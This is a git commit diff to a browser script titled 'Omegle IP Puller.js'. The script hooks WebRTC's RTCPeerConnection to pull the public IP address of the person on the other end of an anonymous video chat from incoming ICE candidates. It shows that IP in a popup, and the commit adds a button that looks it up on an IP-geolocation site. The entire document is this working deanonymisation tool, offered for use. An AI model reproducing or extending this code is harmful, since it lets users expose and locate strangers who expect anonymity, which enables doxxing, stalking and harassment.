c50b85fc5a3fbfd86916a16fd01cf386a36c467a
Jay <20913004+jlaiii@users.noreply.github.com>
2022-12-18 00:52:37 -0800

    Add files via upload

--- Omegle IP Puller.js
+++ Omegle IP Puller.js
@@ -1,19 +1,20 @@
 const oRTCPeerConnection = window.RTCPeerConnection || window.oRTCPeerConnection;
-
 window.RTCPeerConnection = function(...args) {
   const pc = new oRTCPeerConnection(...args);
-
   const addIceCandidate = pc.addIceCandidate.bind(pc);
   pc.addIceCandidate = function(iceCandidate, ...rest) {
     const fields = iceCandidate.candidate.split(' ');
     if (fields[7] === 'srflx') {
       console.log('IP Address:', fields[4]);
-      // Create a new window
       const ipWindow = window.open("", "IP Window", "height=100,width=200");
-      // Clear the inner HTML of the window
       ipWindow.document.body.innerHTML = "";
-      // Write the IP address to the new window
-      ipWindow.document.write("IP Address: " + fields[4]);
+      ipWindow.document.write("IP Address: " + fields[4] + "<br>");
+      const button = document.createElement("button");
+      button.innerHTML = "IP Lookup";
+      button.addEventListener("click", function() {
+        window.open("https://whatismyipaddress.com/ip/" + fields[4]);
+      });
+      ipWindow.document.body.appendChild(button);
     }
     return addIceCandidate(iceCandidate, ...rest);
   }
